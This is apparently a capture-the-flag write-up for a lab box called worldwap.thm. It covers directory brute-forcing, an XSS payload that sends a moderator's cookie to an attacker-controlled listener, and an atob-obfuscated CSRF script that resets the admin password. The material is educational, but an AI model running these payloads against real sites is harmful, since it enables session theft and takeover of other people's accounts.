
## nmap scan
![](Pasted%20image%2020250208160826.png)

- 22 - ssh open
- 80 - cookie httponly secure flag not set

Let s see what is on port 8081 
	![](Pasted%20image%2020250208161928.png)
	![](Pasted%20image%2020250208161957.png)

```shell
(root㉿kali)-[~]
└─# dirbuster -u http://worldwap.thm:8081 -l /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
File found: /index.php - 200
Feb 08, 2025 2:17:59 PM org.apache.commons.httpclient.HttpMethodBase processCookieHeaders
WARNING: Cookie rejected: "$Version=0; PHPSESSID=ltqln2ktcei1me78r6069f4ntl; $Path=/; $Domain=.worldwap.thm". Illegal domain attribute ".worldwap.thm". Domain of origin: "worldwap.thm"
Feb 08, 2025 2:17:59 PM org.apache.commons.httpclient.HttpMethodBase processCookieHeaders
WARNING: Cookie rejected: "$Version=0; PHPSESSID=rcs2an6hlmgm0ph5uim4lvlvt8; $Path=/; $Domain=.worldwap.thm". Illegal domain attribute ".worldwap.thm". Domain of origin: "worldwap.thm"
File found: /login.php - 200
Dir found: /icons/ - 403
File found: /profile.php - 302
File found: /clear.php - 200
Dir found: /assets/ - 200
File found: /chat.php - 302
Dir found: /icons/small/ - 403
File found: /db.php - 200
Dir found: /javascript/ - 403
File found: /logout.php - 302
File found: /setup.php - 200
File found: /block.php - 200
```

Nothing interesting found therefore we will get back at the main app hosted on port 80

## moderator account takeover
### **XSS (cookie steal)**
Let s try to create an account
	![](Pasted%20image%2020250208185950.png)
When we try to log in with the just created account we get the following message: ''user not verified" which means that our account was not validated by an authorithy(in our case an account moderator)
	![](Pasted%20image%2020250208190119.png)
We can try to register another account but this time to inject an XSS payload that will steal the moderator cookie once he will open our registration:

```javascript
<img src="nbyte" onerror="fetch('http://10.10.117.68:8000/?cookie='+document.cookie)">
```
OR
```javascript
<img src="nbyte2" onerror="fetch('http://10.10.117.68:8000/?secret='+encodeURIComponent(document.cookie))">
```

![](Pasted%20image%2020250208191234.png)

Now let s try to steal the moderator session using his cookies:
	![](Pasted%20image%2020250208191350.png)
		![](Pasted%20image%2020250208191459.png)

## administrator account takeover
### **CSRF (request of password change)**

We have noticed the change password feature and it s endpoint (it is useful functionality for our CSRF payload)
	![](Pasted%20image%2020250208213857.png)
Parameter that we wanna change is new_password (this one will be injected in our req)
	![](Pasted%20image%2020250208220056.png)Also we have the chat option where we can get in touch with our actual victim(admin)
	![](Pasted%20image%2020250208214135.png)

Perfect scenario until now... let's build the payload script that will be sent over the chat. Here's an example of how an attacker can update a password  and send an asynchronous request to update email/password seamlessly.

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://worldwap.thm:8081/change_password.php', true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            alert("Action executed!");
        }
    };
    
    xhr.send('action=execute&new_password=NBYTE');
</script>
```

However, it must be noticed that our payload is included now in a `<href` attribute (is converted as a direct link)
	![](Pasted%20image%2020250208220532.png)

To solve this problem we have to encode whole url and use javascript decoder built in function `atob`.
	![](Pasted%20image%2020250208220659.png)
```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST',atob( 'aHR0cDovL3dvcmxkd2FwLnRobTo4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA='), true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            alert("Action executed!");
        }
    };
    
    xhr.send('action=execute&new_password=NBYTE');
</script>
```

![](Pasted%20image%2020250208220940.png)

Now we can log in into the admin page with the newly created password :)

